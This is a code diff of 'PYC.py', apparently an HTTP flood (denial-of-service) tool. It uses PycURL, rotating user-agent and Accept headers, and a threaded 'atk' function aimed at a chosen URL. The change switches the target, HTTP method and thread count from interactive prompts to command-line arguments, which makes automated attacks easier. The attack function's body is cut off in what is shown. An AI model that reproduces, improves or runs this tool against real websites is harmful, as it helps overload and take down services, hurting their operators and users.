@@ -1,7 +1,7 @@
 # PYC.py by PhynX404 AKA PhynX
 # this tool based on PycURL
 
-import pycurl,threading,random
+import pycurl,threading,random,sys
 from io import BytesIO,StringIO
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -128,9 +128,9 @@ acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;
 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"]
 
-urltarget = str(input("URL Target: "))
-method = str(input("Method (GET/POST/HEAD): "))
-thr = int(input("Thread: "))
+urltarget = str(sys.argv[1])
+method = str(sys.argv[2])
+thr = int(sys.argv[3])
 
 def atk(a, b, c):
 	print("Threads #"+str(c)+" Started...")
